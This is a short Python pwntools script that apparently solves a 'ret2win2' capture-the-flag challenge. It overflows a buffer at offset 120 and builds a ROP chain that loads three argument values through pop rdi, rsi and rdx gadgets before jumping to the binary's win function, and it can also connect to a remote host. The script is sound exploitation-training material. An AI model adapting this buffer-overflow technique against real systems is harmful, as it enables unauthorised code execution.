from pwn import *


def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)


gdbscript = """
init-pwndbg
continue
""".format(**locals())

exe = "./ret2win2"
elf = context.binary = ELF(exe, checksec=False)
context.log_level = "info"
context.terminal = "kitty"

io = start()
offset = 120

pop_rdi = ROP(exe).find_gadget(["pop rdi", "ret"])[0]
pop_rsi = ROP(exe).find_gadget(["pop rsi", "ret"])[0]
pop_rdx = ROP(exe).find_gadget(["pop rdx", "ret"])[0]

payload = flat(
    {
        offset: [
            pop_rdi + 1,
            pop_rdi,
            0xDEADBEEFDEADBEEF,
            pop_rsi,
            0xABCD1234DCBA4321,
            pop_rdx,
            0x147147147147147,
            elf.sym["win"],
        ]
    }
)

io.sendline(payload)

io.interactive()
